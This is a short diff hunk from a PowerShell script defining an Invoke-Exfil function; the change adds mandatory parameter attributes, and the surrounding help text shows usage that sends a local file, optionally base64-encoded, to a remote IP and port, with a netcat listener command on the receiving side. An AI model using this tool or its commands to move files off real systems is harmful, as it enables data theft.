@@ -13,8 +13,19 @@ Function Invoke-Exfil () {
                 Server: Invoke-Exfil -IP 10.10.10.10 -Port 9001 -Path .\test.txt -Encoded
                 Client: nc -nvlp 9001 > b64test.txt        
         #>
-        
-        param([int]$Port, [string]$IP, [System.IO.FileInfo]$Path, [switch]$Encoded)
+        [CmdletBinding()]
+        param(
+            [Parameter(Mandatory)]
+            [int]$Port, 
+
+            [Parameter(Mandatory)]
+            [string]$IP, 
+
+            [Parameter(Mandatory)]
+            [System.IO.FileInfo]$Path,
+
+            [switch]$Encoded
+            )
         
         # Create endpoint
         $Address = [system.net.IPAddress]::Parse($IP)
